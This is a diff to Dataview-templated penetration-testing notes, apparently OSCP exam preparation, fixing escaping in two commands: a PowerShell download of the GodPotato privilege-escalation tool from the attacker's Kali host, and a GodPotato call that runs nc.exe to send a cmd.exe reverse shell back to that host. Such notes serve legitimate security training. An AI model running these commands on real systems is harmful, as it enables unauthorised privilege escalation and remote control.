@@ -74,7 +74,7 @@ POWERSHELL
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `iwr -uri http://${KaliIP}/GodPotato.exe -OutFile C:\Windows\Tasks\GodPotato.exe`;
+const command = `iwr -uri http://${KaliIP}/GodPotato.exe -OutFile C:\\\Windows\\\Tasks\\\GodPotato.exe`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -120,7 +120,7 @@ Catch a reverse connection on the listener
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `GodPotato -cmd "C:\\\Windows\\\Tasks\\nc.exe -t -e C:\\\Windows\\\System32\\\cmd.exe ${KaliIP} 135`;
+const command = `GodPotato -cmd "C:\\\Windows\\\Tasks\\nc.exe -t -e C:\\\Windows\\\System32\\\cmd.exe ${KaliIP} 135"`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
